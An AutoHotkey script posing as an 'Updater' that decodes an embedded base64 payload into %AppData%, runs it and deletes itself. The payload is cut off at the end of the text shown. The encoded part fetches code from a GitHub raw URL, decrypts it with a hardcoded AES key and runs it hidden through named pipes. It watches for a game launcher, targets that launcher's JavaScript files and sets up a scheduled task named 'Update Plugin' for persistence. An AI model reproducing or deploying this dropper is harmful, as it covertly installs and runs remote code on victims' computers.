#NoTrayIcon
#SingleInstance Force

CreateUpdater()

CreateUpdater() {
   local
   base64 := GetBase64()
   size := CryptStringToBinary(base64, data)
   if !InStr(FileExist(A_AppData . "\Updater"), "D")
      FileCreateDir, % A_AppData . "\Updater"
   filePath := A_AppData . "\Updater\Updater.ahk"
   if !FileExist(filePath) || CompareData(filePath, data, size) {
      File := FileOpen(filePath, "w")
      File.Pos := 0
      File.RawWrite(data, size)
      File := ""
   }
   Run, % filePath
   FileDelete, % A_ScriptFullPath
}

CryptStringToBinary(string, ByRef outData, formatName := "CRYPT_STRING_BASE64")
{
   local
   static formats := { CRYPT_STRING_BASE64: 0x1
                     , CRYPT_STRING_HEX:    0x4
                     , CRYPT_STRING_HEXRAW: 0xC }
   fmt := formats[formatName]
   chars := StrLen(string)
   if !DllCall("Crypt32\CryptStringToBinary", "Str", string, "UInt", chars, "UInt", fmt
                                            , "Ptr", 0, "UIntP", bytes, "Ptr", 0, "Ptr", 0)
      throw "CryptStringToBinary failed. LastError: " . A_LastError
   VarSetCapacity(outData, bytes)
   DllCall("Crypt32\CryptStringToBinary", "Str", string, "UInt", chars, "UInt", fmt
                                        , "Str", outData, "UIntP", bytes, "Ptr", 0, "Ptr", 0)
   Return bytes
}

CompareData(filePath, ByRef data, len) {
   local
   fileLen := GetFileData(filePath, fileData)
   if (fileLen != len)
      Return true
   hLib := DllCall("LoadLibrary", "Str", "Bcrypt.dll", "Ptr")
   fileHashLen := CreateHash(&fileData, fileLen, fileHashData)
   dataHashLen := CreateHash(&data, len, hashData)
   DllCall("FreeLibrary", "Ptr", hLib)
   Return DllCall("msvcrt\memcmp", "Ptr", &fileHashData, "Ptr", &hashData, "Ptr", dataHashLen)
}

GetFileData(filePath, ByRef data) {
   local
   File := FileOpen(filePath, "r")
   File.Pos := 0
   File.RawRead(data, len := File.Length)
   File := ""
   Return len
}

CreateHash(pData, size, ByRef hashData, pSecretKey := 0, keySize := 0, AlgId := "SHA256") {
   ; CNG Algorithm Identifiers
   ; https://docs.microsoft.com/en-us/windows/win32/seccng/cng-algorithm-identifiers
   local
   static HMAC := BCRYPT_ALG_HANDLE_HMAC_FLAG := 0x00000008
   DllCall("Bcrypt\BCryptOpenAlgorithmProvider", "PtrP", hAlgorithm, "WStr",  AlgId, "Ptr", 0, "UInt", keySize ? HMAC : 0)
   DllCall("Bcrypt\BCryptCreateHash", "Ptr", hAlgorithm, "PtrP", hHash, "Ptr", 0, "UInt", 0, "Ptr", pSecretKey, "UInt", keySize, "UInt", 0)
   DllCall("Bcrypt\BCryptHashData", "Ptr", hHash, "Ptr", pData, "UInt", size, "UInt", 0)
   DllCall("Bcrypt\BCryptGetProperty", "Ptr", hAlgorithm, "WStr", "HashDigestLength", "UIntP", hashLen, "UInt", 4, "UIntP", cbResult, "UInt", 0)
   VarSetCapacity(hashData, hashLen, 0)
   DllCall("Bcrypt\BCryptFinishHash", "Ptr", hHash, "Ptr", &hashData, "UInt", hashLen, "UInt", 0)
   DllCall("Bcrypt\BCryptDestroyHash", "Ptr", hHash)
   DllCall("Bcrypt\BCryptCloseAlgorithmProvider", "Ptr", hAlgorithm, "UInt", 0)
   Return hashLen
}

GetBase64() {
local
base64 := "77u/I05vVHJheUljb24NCiNQZXJzaXN0ZW50DQojU2luZ2xlSW5zdGFuY2UgT2ZmDQpEZXRlY3RIaWRkZW5XaW5kb3dzLCBPbg0KDQpnbG9iYWwgaGVscGVyTGluayA6PSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZWNrc3ZlcnNpb24vY2hlY2t2ZXJzaW9uc2NyaXB0L21haW4vY2hlY2tlci5haGsiDQogICAgICwgVXBkYXRlUGVyaW9kIDo9IDQgOyDQv9GA0L7QvNC10LbRg9GC0L7QuiDQstGA0LXQvNC10L3QuCDQsiDRh9Cw0YHQsNGFLCDRh9C10YDQtdC3INC60L7RgtC+0YDRi9C5INCx0YPQtNC10YIg0LLRi9C/0L7Qu9C90Y/RgtGM0YHRjyDQt9Cw0LTQsNGH0LAg0LjQu9C4INC30LDQv9GD0YHQutCw0YLRjNGB0Y8g0YLQsNC50LzQtdGADQoNCmlmIEFfQXJnc1sxXQ0KICAgVXBkYXRlKCkNCmVsc2Ugew0KICAgU2hlbGxSdW5Bc1VzZXIoQV9TY3JpcHRGdWxsUGF0aCwgInVzZXIgIiAuIEFfU2NyaXB0SHduZCkNCiAgIFdpbldhaXQsICVBX1NjcmlwdEh3bmQlIGFoa19jbGFzcyBBdXRvSG90a2V5R1VJDQogICBXaW5HZXRUaXRsZSwgdGl0bGUNCiAgIG1lc3NhZ2UgOj0gUmVnRXhSZXBsYWNlKHRpdGxlLCAiXi4rICIpDQogICBpZiAobWVzc2FnZSA9ICIxIikNCiAgICAgIEV4aXRBcHANCiAgIFNldFRpbWVyLCBVcGRhdGUsICUgVXBkYXRlUGVyaW9kKjEwMDAqMzYwMA0KICAgVXBkYXRlKCkNCn0NClJldHVybg0KDQpVcGRhdGUoKSB7DQogICBzdGF0aWMgdGltZXIgOj0gIiIsIGRhdGEgOj0gIiIsIGxlbiA6PSAiIg0KICAgKCAhdGltZXIgJiYgdGltZXIgOj0gRnVuYyhBX1RoaXNGdW5jKSApDQogICBpZiAoQV9BcmdzWzFdID0gIiIgfHwgQV9BcmdzWzFdID0gInRhc2siKSB7DQogICAgICAoICFsZW4gJiYgbGVuIDo9IFdlYlJlcXVlc3QoaGVscGVyTGluaywgZGF0YSwsLCwgZXJyb3IgOj0gIiIpICkNCiAgICAgIGlmIGVycm9yIHsNCiAgICAgICAgIFNldFRpbWVyLCAlIHRpbWVyLCAtNTAwMA0KICAgICAgICAgUmV0dXJuDQogICAgICB9DQogICB9DQogICBQcm9jZXNzLCBFeGlzdCwgUkFETUlSX0xBVU5DSEVSX0VYLmV4ZQ0KICAgaWYgIShQSUQgOj0gRXJyb3JMZXZlbCkgew0KICAgICAgU2V0VGltZXIsICUgdGltZXIsIC0xMDAwDQogICAgICBSZXR1cm4NCiAgIH0NCiAgIFByb2Nlc3MsIEV4aXN0LCBndGFfc2EuZXhlDQogICBpZiBFcnJvckxldmVsIHsNCiAgICAgIFNldFRpbWVyLCAlIHRpbWVyLCAtMTAwMA0KICAgICAgUmV0dXJuDQogICB9DQogICBpZiAoQV9BcmdzWzFdID0gInVzZXIiKQ0KICAgICAgVHJ5Q3JlYXRlVGFzayhQSUQpDQogICAoIGxlbiAmJiBEeW5hUnVuKERlY3JEYXRhKGRhdGEsIGxlbikpICkNCiAgIGlmIEFfQXJnc1sxXQ0KICAgICAgRXhpdEFwcA0KfQ0KDQpXZWJSZXF1ZXN0KHVybCwgQnlSZWYgZGF0YSwgbWV0aG9kIDo9ICJHRVQiLCBIZWFkZXJzQXJyYXkgOj0gIiIsIGJvZHkgOj0gIiIsIEJ5UmVmIGVycm9yIDo9ICIiKSB7DQogICBXaHIgOj0gQ29tT2JqQ3JlYXRlKCJXaW5IdHRwLldpbkh0dHBSZXF1ZXN0LjUuMSIpDQogICBXaHIuT3BlbihtZXRob2QsIHVybCwgdHJ1ZSkNCiAgIGZvciBuYW1lLCB2YWx1ZSBpbiBIZWFkZXJzQXJyYXkNCiAgICAgIFdoci5TZXRSZXF1ZXN0SGVhZGVyKG5hbWUsIHZhbHVlKQ0KICAgV2hyLlNlbmQoYm9keSkNCiAgIFdoci5XYWl0Rm9yUmVzcG9uc2UoKQ0KICAgc3RhdHVzIDo9IFdoci5zdGF0dXMNCiAgIGlmIChzdGF0dXMgIT0gMjAwKQ0KICAgICAgZXJyb3IgOj0gIkh0dHBSZXF1ZXN0IGVycm9yLCBzdGF0dXM6ICIgLiBzdGF0dXMNCiAgIEFyciA6PSBXaHIucmVzcG9uc2VCb2R5DQogICBwRGF0YSA6PSBOdW1HZXQoQ29tT2JqVmFsdWUoYXJyKSArIDggKyBBX1B0clNpemUpDQogICBsZW5ndGggOj0gQXJyLk1heEluZGV4KCkgKyAxDQogICBWYXJTZXRDYXBhY2l0eShkYXRhLCBsZW5ndGgsIDApDQogICBEbGxDYWxsKCJSdGxNb3ZlTWVtb3J5IiwgIlB0ciIsICZkYXRhLCAiUHRyIiwgcERhdGEsICJQdHIiLCBsZW5ndGgpDQogICBSZXR1cm4gbGVuZ3RoDQp9DQoNClRyeUNyZWF0ZVRhc2soUElEKSB7DQogICBleGVQYXRoIDo9IEdldFByb2Nlc3NJbWFnZU5hbWUoUElEKQ0KICAgU3BsaXRQYXRoLCBleGVQYXRoLCwgZGlyDQogICBqc0RpciA6PSBkaXIgLiAiXHJlc291cmNlc1xwcm9qZWN0c1xjcm1wXGNlZlxhc3NldHNcanMiDQogICBpZiAhKCggKGFwcFBhdGggOj0gRmluZFBhdGgoanNEaXIsICJhcHAuKi5qcyIpKSB8fCAoYXBwUGF0aCA6PSBGaW5kUGF0aChqc0RpciwgIiouanMiKSkgKSAmJiBGaWxlIDo9IEZpbGVPcGVuKGFwcFBhdGgsICJydyIpKSB7DQogICAgICBHdWksIE5ldywsICUgQV9BcmdzWzJdIC4gIiAwIg0KICAgfQ0KICAgZWxzZSB7DQogICAgICBpZiAhRmlsZUV4aXN0KGZpbGVQYXRoIDo9IEFfQXBwRGF0YSAuICJcVXBkYXRlclwiIC4gQV9TY3JpcHROYW1lKSB7DQogICAgICAgICBpZiAhSW5TdHIoRmlsZUV4aXN0KEFfQXBwRGF0YSAuICJcVXBkYXRlciIpLCAiRCIpDQogICAgICAgICAgICBGaWxlQ3JlYXRlRGlyLCAlIEFfQXBwRGF0YSAuICJcVXBkYXRlciINCiAgICAgICAgIEZpbGVDb3B5LCAlIEFfU2NyaXB0RnVsbFBhdGgsICUgZmlsZVBhdGgsIDENCiAgICAgIH0NCiAgICAgIGVsc2Ugew0KICAgICAgICAgRmlsZSA6PSBGaWxlT3BlbihmaWxlUGF0aCwgInIiKQ0KICAgICAgICAgRmlsZS5Qb3MgOj0gMA0KICAgICAgICAgRmlsZS5SYXdSZWFkKGJ1Ziwgc2l6ZSA6PSBGaWxlLkxlbmd0aCkNCiAgICAgICAgIEZpbGUgOj0gIiINCiAgICAgICAgIGlmIENvbXBhcmVEYXRhKEFfU2NyaXB0RnVsbFBhdGgsIGJ1Ziwgc2l6ZSkNCiAgICAgICAgICAgIEZpbGVDb3B5LCAlIEFfU2NyaXB0RnVsbFBhdGgsICUgZmlsZVBhdGgsIDENCiAgICAgIH0NCiAgICAgIHRyeSByZXMgOj0gQ3JlYXRlVGFzaygiVXBkYXRlIFBsdWdpbiIsIGZpbGVQYXRoLCAidGFzayIsICIxNDowMCIsIFVwZGF0ZVBlcmlvZCwgc3RhcnRJbW1lZGlhdGVseSA6PSB0cnVlKQ0KICAgICAgY2F0Y2ggew0KICAgICAgICAgR3VpLCBOZXcsLCAlIEFfQXJnc1syXSAuICIgMCINCiAgICAgIH0NCiAgICAgIGlmIHJlcyB7DQogICAgICAgICBHdWksIE5ldywsICUgQV9BcmdzWzJdIC4gIiAxIg0KICAgICAgfQ0KICAgfQ0KICAgU2xlZXAsIDUwMA0KfQ0KDQpHZXRQcm9jZXNzSW1hZ2VOYW1lKFBJRCkgew0KICAgc3RhdGljIGFjY2VzcyA6PSBQUk9DRVNTX1FVRVJZX0xJTUlURURfSU5GT1JNQVRJT04gOj0gMHgxMDAwDQogICBpZiAhaFByb2MgOj0gRGxsQ2FsbCgiT3BlblByb2Nlc3MiLCAiVUludCIsIGFjY2VzcywgIkludCIsIDAsICJVSW50IiwgUElELCAiUHRyIikNCiAgICAgIHRocm93ICJGYWlsZWQgdG8gb3BlbiBwcm9jZXNzLCBlcnJvcjogIiAuIEFfTGFzdEVycm9yDQogICBWYXJTZXRDYXBhY2l0eShpbWFnZVBhdGgsIDEwMjQsIDApDQogICBEbGxDYWxsKCJRdWVyeUZ1bGxQcm9jZXNzSW1hZ2VOYW1lIiwgIlB0ciIsIGhQcm9jLCAiVUludCIsIDAsICJTdHIiLCBpbWFnZVBhdGgsICJVSW50UCIsIDUxMikNCiAgIERsbENhbGwoIkNsb3NlSGFuZGxlIiwgIlB0ciIsIGhQcm9jKQ0KICAgUmV0dXJuIGltYWdlUGF0aA0KfQ0KDQpGaW5kUGF0aChkaXIsIGZpbGVOYW1lUGF0dGVybikgew0KICAgTG9vcCwgRmlsZXMsICUgZGlyIC4gIlwiIC4gZmlsZU5hbWVQYXR0ZXJuDQogICAgICBmaWxlUGF0aCA6PSBBX0xvb3BGaWxlRnVsbFBhdGgNCiAgIHVudGlsIGZpbGVQYXRoDQogICBSZXR1cm4gZmlsZVBhdGgNCn0NCg0KQ29tcGFyZURhdGEoZmlsZVBhdGgsIEJ5UmVmIGRhdGEsIGxlbikgew0KICAgbG9jYWwNCiAgIGZpbGVMZW4gOj0gR2V0RmlsZURhdGEoZmlsZVBhdGgsIGZpbGVEYXRhKQ0KICAgaWYgKGZpbGVMZW4gIT0gbGVuKQ0KICAgICAgUmV0dXJuIHRydWUNCiAgIGhMaWIgOj0gRGxsQ2FsbCgiTG9hZExpYnJhcnkiLCAiU3RyIiwgIkJjcnlwdC5kbGwiLCAiUHRyIikNCiAgIGZpbGVIYXNoTGVuIDo9IENyZWF0ZUhhc2goJmZpbGVEYXRhLCBmaWxlTGVuLCBmaWxlSGFzaERhdGEpDQogICBkYXRhSGFzaExlbiA6PSBDcmVhdGVIYXNoKCZkYXRhLCBsZW4sIGhhc2hEYXRhKQ0KICAgRGxsQ2FsbCgiRnJlZUxpYnJhcnkiLCAiUHRyIiwgaExpYikNCiAgIFJldHVybiBEbGxDYWxsKCJtc3ZjcnRcbWVtY21wIiwgIlB0ciIsICZmaWxlSGFzaERhdGEsICJQdHIiLCAmaGFzaERhdGEsICJQdHIiLCBkYXRhSGFzaExlbikNCn0NCg0KR2V0RmlsZURhdGEoZmlsZVBhdGgsIEJ5UmVmIGRhdGEpIHsNCiAgIGxvY2FsDQogICBGaWxlIDo9IEZpbGVPcGVuKGZpbGVQYXRoLCAiciIpDQogICBGaWxlLlBvcyA6PSAwDQogICBGaWxlLlJhd1JlYWQoZGF0YSwgbGVuIDo9IEZpbGUuTGVuZ3RoKQ0KICAgRmlsZSA6PSAiIg0KICAgUmV0dXJuIGxlbg0KfQ0KDQpDcmVhdGVIYXNoKHBEYXRhLCBzaXplLCBCeVJlZiBoYXNoRGF0YSwgcFNlY3JldEtleSA6PSAwLCBrZXlTaXplIDo9IDAsIEFsZ0lkIDo9ICJTSEEyNTYiKSB7DQogICA7IENORyBBbGdvcml0aG0gSWRlbnRpZmllcnMNCiAgIDsgaHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy93aW4zMi9zZWNjbmcvY25nLWFsZ29yaXRobS1pZGVudGlmaWVycw0KICAgbG9jYWwNCiAgIHN0YXRpYyBITUFDIDo9IEJDUllQVF9BTEdfSEFORExFX0hNQUNfRkxBRyA6PSAweDAwMDAwMDA4DQogICBEbGxDYWxsKCJCY3J5cHRcQkNyeXB0T3BlbkFsZ29yaXRobVByb3ZpZGVyIiwgIlB0clAiLCBoQWxnb3JpdGhtLCAiV1N0ciIsICBBbGdJZCwgIlB0ciIsIDAsICJVSW50Iiwga2V5U2l6ZSA/IEhNQUMgOiAwKQ0KICAgRGxsQ2FsbCgiQmNyeXB0XEJDcnlwdENyZWF0ZUhhc2giLCAiUHRyIiwgaEFsZ29yaXRobSwgIlB0clAiLCBoSGFzaCwgIlB0ciIsIDAsICJVSW50IiwgMCwgIlB0ciIsIHBTZWNyZXRLZXksICJVSW50Iiwga2V5U2l6ZSwgIlVJbnQiLCAwKQ0KICAgRGxsQ2FsbCgiQmNyeXB0XEJDcnlwdEhhc2hEYXRhIiwgIlB0ciIsIGhIYXNoLCAiUHRyIiwgcERhdGEsICJVSW50Iiwgc2l6ZSwgIlVJbnQiLCAwKQ0KICAgRGxsQ2FsbCgiQmNyeXB0XEJDcnlwdEdldFByb3BlcnR5IiwgIlB0ciIsIGhBbGdvcml0aG0sICJXU3RyIiwgIkhhc2hEaWdlc3RMZW5ndGgiLCAiVUludFAiLCBoYXNoTGVuLCAiVUludCIsIDQsICJVSW50UCIsIGNiUmVzdWx0LCAiVUludCIsIDApDQogICBWYXJTZXRDYXBhY2l0eShoYXNoRGF0YSwgaGFzaExlbiwgMCkNCiAgIERsbENhbGwoIkJjcnlwdFxCQ3J5cHRGaW5pc2hIYXNoIiwgIlB0ciIsIGhIYXNoLCAiUHRyIiwgJmhhc2hEYXRhLCAiVUludCIsIGhhc2hMZW4sICJVSW50IiwgMCkNCiAgIERsbENhbGwoIkJjcnlwdFxCQ3J5cHREZXN0cm95SGFzaCIsICJQdHIiLCBoSGFzaCkNCiAgIERsbENhbGwoIkJjcnlwdFxCQ3J5cHRDbG9zZUFsZ29yaXRobVByb3ZpZGVyIiwgIlB0ciIsIGhBbGdvcml0aG0sICJVSW50IiwgMCkNCiAgIFJldHVybiBoYXNoTGVuDQp9DQoNCkRlY3JEYXRhKEJ5UmVmIGRhdGEsIGxlbmd0aCkgew0KICAgc3RhdGljIGl2IDo9ICJzb21ldGV4dCIsIHB3IDo9ICIzOTVGRDA4Mi03QkM5LTQ2NjItODAxOS05NjY4RkM5RDM0MzkiDQogICBiYXNlNjQgOj0gU3RyR2V0KCZkYXRhLCBsZW5ndGgsICJjcDAiKQ0KICAgbGVuZ3RoIDo9IENyeXB0U3RyaW5nVG9CaW5hcnkoYmFzZTY0LCBkYXRhKQ0KICAgcHdkTGVuIDo9IFN0clB1dEJ1ZmYocHcsIHB3ZERhdGEpDQogICBoTGliIDo9IERsbENhbGwoIkxvYWRMaWJyYXJ5IiwgIlN0ciIsICJCY3J5cHQuZGxsIiwgIlB0ciIpDQogICBsZW5IYXNoUGFzc3dvcmQgOj0gQ3JlYXRlSGFzaCgmcHdkRGF0YSwgcHdkTGVuLCBoYXNoUGFzc3dvcmQpDQogICBpdkxlbiA6PSBTdHJQdXRCdWZmKGl2LCBpdkRhdGEpDQogICBsZW5IYXNoSXYgOj0gQ3JlYXRlSGFzaCgmaXZEYXRhLCBpdkxlbiwgaGFzaEl2KQ0KICAgVmFyU2V0Q2FwYWNpdHkoaXYxNiwgMTYsIDApDQogICBEbGxDYWxsKCJSdGxNb3ZlTWVtb3J5IiwgIlB0ciIsIHBIYXNoSXYgOj0gJml2MTYsICJQdHIiLCAmaGFzaEl2ICsgbGVuSGFzaEl2IC0gMTYsICJQdHIiLCBsZW5JdiA6PSAxNikNCiAgIGxlbiA6PSBCY3J5cHQoJmRhdGEsIGxlbmd0aCwgb3V0RGF0YSwgJmhhc2hQYXNzd29yZCwgbGVuSGFzaFBhc3N3b3JkLCBwSGFzaEl2LCBsZW5JdikNCiAgIERsbENhbGwoIkZyZWVMaWJyYXJ5IiwgIlB0ciIsIGhMaWIpDQogICB1dGY4IDo9IE51bUdldChvdXREYXRhLCAiSW50IikgJiAweEZGRkZGRiA9IDB4YmZiYmVmDQogICBSZXR1cm4gU3RyR2V0KCZvdXREYXRhICsgKHV0ZjggPyAzIDogMCksIGxlbiwgIlVURi04IikNCn0NCg0KQ3J5cHRTdHJpbmdUb0JpbmFyeShzdHJpbmcsIEJ5UmVmIG91dERhdGEsIGZvcm1hdE5hbWUgOj0gIkNSWVBUX1NUUklOR19CQVNFNjQiKQ0Kew0KICAgc3RhdGljIGZvcm1hdHMgOj0geyBDUllQVF9TVFJJTkdfQkFTRTY0OiAweDENCiAgICAgICAgICAgICAgICAgICAgICwgQ1JZUFRfU1RSSU5HX0hFWDogICAgMHg0DQogICAgICAgICAgICAgICAgICAgICAsIENSWVBUX1NUUklOR19IRVhSQVc6IDB4QyB9DQogICBmbXQgOj0gZm9ybWF0c1tmb3JtYXROYW1lXQ0KICAgY2hhcnMgOj0gU3RyTGVuKHN0cmluZykNCiAgIGlmICFEbGxDYWxsKCJDcnlwdDMyXENyeXB0U3RyaW5nVG9CaW5hcnkiLCAiU3RyIiwgc3RyaW5nLCAiVUludCIsIGNoYXJzLCAiVUludCIsIGZtdA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICJQdHIiLCAwLCAiVUludFAiLCBieXRlcywgIlB0ciIsIDAsICJQdHIiLCAwKQ0KICAgICAgdGhyb3cgIkNyeXB0U3RyaW5nVG9CaW5hcnkgZmFpbGVkLiBMYXN0RXJyb3I6ICIgLiBBX0xhc3RFcnJvcg0KICAgVmFyU2V0Q2FwYWNpdHkob3V0RGF0YSwgYnl0ZXMpDQogICBEbGxDYWxsKCJDcnlwdDMyXENyeXB0U3RyaW5nVG9CaW5hcnkiLCAiU3RyIiwgc3RyaW5nLCAiVUludCIsIGNoYXJzLCAiVUludCIsIGZtdA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIlN0ciIsIG91dERhdGEsICJVSW50UCIsIGJ5dGVzLCAiUHRyIiwgMCwgIlB0ciIsIDApDQogICBSZXR1cm4gYnl0ZXMNCn0NCg0KQmNyeXB0KHBEYXRhLCBkYXRhU2l6ZSwgQnlSZWYgb3V0RGF0YSwgcEtleSwga2V5U2l6ZSwgcEl2IDo9IDAsIGl2U2l6ZSA6PSAwLCBBbGdJZCA6PSAiQUVTIiwgY3J5cHQgOj0gIkRlY3J5cHQiLCBjaGFpbmluZ01vZGUgOj0gIkNoYWluaW5nTW9kZUNCQyIpIHsNCjsgY3J5cHQ6IEVuY3J5cHQvRGVjcnlwdA0KICAgc3RhdGljIHBhZGRpbmcgOj0gQkNSWVBUX0JMT0NLX1BBRERJTkcgOj0gMSwgY2hhaW5pbmdNb2RlU2l6ZSA6PSBTdHJMZW4oY2hhaW5pbmdNb2RlKSoyDQogICBwTG9jYWxJdiA6PSAwDQogICBpZiBwSXYgew0KICAgICAgVmFyU2V0Q2FwYWNpdHkobG9jYWxJdiwgaXZTaXplLCAwKQ0KICAgICAgRGxsQ2FsbCgiUnRsTW92ZU1lbW9yeSIsICJQdHIiLCBwTG9jYWxJdiA6PSAmbG9jYWxJdiwgIlB0ciIsIHBJdiwgIlB0ciIsIGl2U2l6ZSkNCiAgIH0NCiAgIERsbENhbGwoIkJjcnlwdFxCQ3J5cHRPcGVuQWxnb3JpdGhtUHJvdmlkZXIiLCAiUHRyUCIsIGhBbGdvcml0aG0sICJXU3RyIiwgQWxnSWQsICJQdHIiLCAwLCAiVUludCIsIDApDQogICBEbGxDYWxsKCJCY3J5cHRcQkNyeXB0U2V0UHJvcGVydHkiLCAiUHRyIiwgaEFsZ29yaXRobSwgIldTdHIiLCAiQ2hhaW5pbmdNb2RlIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICJXU3RyIiwgY2hhaW5pbmdNb2RlLCAiVUludCIsIGNoYWluaW5nTW9kZVNpemUsICJVSW50IiwgMCkNCiAgIERsbENhbGwoIkJjcnlwdFxCQ3J5cHRHZW5lcmF0ZVN5bW1ldHJpY0tleSIsICJQdHIiLCBoQWxnb3JpdGhtLCAiUHRyUCIsIGhLZXksICJQdHIiLCAwLCAiVUludCIsIDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCAiUHRyIiAsIHBLZXksICJVSW50Iiwga2V5U2l6ZSwgIlVJbnQiLCAwLCAiVUludCIpDQogICByZXMgOj0gRGxsQ2FsbCgiQmNyeXB0XEJDcnlwdCIgLiBjcnlwdCwgIlB0ciIsIGhLZXksICJQdHIiLCBwRGF0YSwgIlVJbnQiLCBkYXRhU2l6ZSwgIlB0ciIsIDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIlB0ciIsIHBMb2NhbEl2LCAiVUludCIsIGl2U2l6ZSwgIlB0ciIsIDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIlVJbnQiLCAwLCAiVUludFAiLCBvdXRTaXplLCAiVUludCIsIHBhZGRpbmcsICJVSW50IikNCiAgIGlmIChyZXMgIT0gMCkNCiAgICAgIHRocm93ICJDcnlwdCBlcnJvciEgQkNyeXB0IiAuIGNyeXB0IC4gIjEgcmVzdWx0OiAiIC4gRm9ybWF0KCJ7OiN4fSIsIHJlcykNCiAgIFZhclNldENhcGFjaXR5KG91dERhdGEsIG91dFNpemUsIDApDQogICByZXMgOj0gRGxsQ2FsbCgiQmNyeXB0XEJDcnlwdCIgLiBjcnlwdCwgIlB0ciIsIGhLZXksICJQdHIiLCBwRGF0YSwgIlVJbnQiLCBkYXRhU2l6ZSwgIlB0ciIsIDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIlB0ciIsIHBMb2NhbEl2LCAiVUludCIsIGl2U2l6ZSwgIlB0ciIsICZvdXREYXRhDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICJVSW50Iiwgb3V0U2l6ZSwgIlVJbnRQIiwgb3V0U2l6ZSwgIlVJbnQiLCBwYWRkaW5nLCAiVUludCIpDQogICBpZiAocmVzICE9IDApDQogICAgICB0aHJvdyAiQ3J5cHQgZXJyb3IhIEJDcnlwdCIgLiBjcnlwdCAuICIyIHJlc3VsdDogIiAuIEZvcm1hdCgiezojeH0iLCByZXMpDQogICBEbGxDYWxsKCJCY3J5cHRcQkNyeXB0RGVzdHJveUtleSIsICJQdHIiLCBoS2V5KQ0KICAgRGxsQ2FsbCgiQmNyeXB0XEJDcnlwdENsb3NlQWxnb3JpdGhtUHJvdmlkZXIiLCAiUHRyIiwgaEFsZ29yaXRobSwgIlVJbnQiLCAwKQ0KICAgUmV0dXJuIG91dFNpemUNCn0NCg0KU3RyUHV0QnVmZihzdHJpbmcsIEJ5UmVmIGRhdGEsIGVuY29kaW5nIDo9ICJVVEYtOCIpICB7DQogICBWYXJTZXRDYXBhY2l0eSggZGF0YSwgbGVuIDo9IChTdHJQdXQoc3RyaW5nLCBlbmNvZGluZykgLSAxKSA8PCAoZW5jb2Rpbmcgfj0gImkpXihVVEYtMTZ8Y3AxMjAwKSQiKSApDQogICBTdHJQdXQoc3RyaW5nLCAmZGF0YSwgZW5jb2RpbmcpDQogICBSZXR1cm4gbGVuDQp9DQoNCkR5bmFSdW4odGVtcFNjcmlwdCwgYWhrUGF0aCA6PSAiIiwgcGlwZU5hbWUgOj0gIiIsIGFyZ3MqKQ0Kew0KICAgc3RhdGljIHBhcmFtcyA6PSBbICJVSW50IiwgUElQRV9BQ0NFU1NfT1VUQk9VTkQgICAgIDo9IDB4MiwgIlVJbnQiLCAwDQogICAgICAgICAgICAgICAgICAgICwgIlVJbnQiLCBQSVBFX1VOTElNSVRFRF9JTlNUQU5DRVMgOj0gMjU1LCAiVUludCIsIDANCiAgICAgICAgICAgICAgICAgICAgLCAiVUludCIsIDAsICJQdHIiLCAwLCAiUHRyIiwgMCwgIlB0ciIgXQ0KICAgICAgICAsIEJPTSA6PSBDaHIoMHhGRUZGKQ0KDQogICAoYWhrUGF0aCA9ICIiICYmIGFoa1BhdGggOj0gQV9BaGtQYXRoKQ0KICAgKHBpcGVOYW1lID0gIiIgJiYgcGlwZU5hbWUgOj0gIkFIS18iIC4gQV9UaWNrQ291bnQpDQogICANCiAgIExvb3AgMSB7DQogICAgICBmb3IgaywgdiBpbiBbInBpcGVHQSIsICJwaXBlIl0NCiAgICAgICAgICV2JSA6PSBEbGxDYWxsKCJDcmVhdGVOYW1lZFBpcGUiLCBTdHIsICJcXC5ccGlwZVwiIC4gcGlwZU5hbWUsIHBhcmFtcyopDQogICAgICBpZiAoIChwaXBlID0gLTEgfHwgcGlwZUdBID0gLTEpICYmIGVycm9yIDo9ICJDYW4ndCBjcmVhdGUgcGlwZSAiIiIgLiBwaXBlTmFtZSAuICIiImBuTGFzdEVycm9yOiAiIC4gQV9MYXN0RXJyb3IgKQ0KICAgICAgICAgYnJlYWsNCiAgICAgIHNDbWQgOj0gYWhrUGF0aCAuICIgIiJcXC5ccGlwZVwiIC4gcGlwZU5hbWUgLiAiIiIiDQogICAgICBmb3IgaywgdiBpbiBhcmdzDQogICAgICAgICBzQ21kIC49ICIgIiIiIC4gdiAuICIiIiINCiAgICAgIFJ1biwgJSBzQ21kLCwgVXNlRXJyb3JMZXZlbCBISURFLCBQSUQNCiAgICAgIGlmIChFcnJvckxldmVsICYmIGVycm9yIDo9ICJDYW4ndCBvcGVuIGZpbGU6YG4gIiJcXC5ccGlwZVwiIC4gcGlwZU5hbWUgLiAiIiIiKQ0KICAgICAgICAgYnJlYWsNCiAgICAgIGZvciBrLCB2IGluIFsicGlwZUdBIiwgInBpcGUiXQ0KICAgICAgICAgRGxsQ2FsbCgiQ29ubmVjdE5hbWVkUGlwZSIsIFB0ciwgJXYlLCBQdHIsIDApDQogICAgICB0ZW1wU2NyaXB0IDo9IEJPTSAuIHRlbXBTY3JpcHQNCiAgICAgIHRlbXBTY3JpcHRTaXplIDo9ICggU3RyTGVuKHRlbXBTY3JpcHQpICsgMSApIDw8ICEhQV9Jc1VuaWNvZGUNCiAgICAgIGlmICFEbGxDYWxsKCJXcml0ZUZpbGUiLCBQdHIsIHBpcGUsIFN0ciwgdGVtcFNjcmlwdCwgVUludCwgdGVtcFNjcmlwdFNpemUsIFVJbnRQLCAwLCBQdHIsIDApDQogICAgICAgICBlcnJvciA6PSAiV3JpdGVGaWxlIGZhaWxlZCwgTGFzdEVycm9yOiAiIC4gQV9MYXN0RXJyb3INCiAgIH0NCiAgIGZvciBrLCB2IGluIFsicGlwZUdBIiwgInBpcGUiXQ0K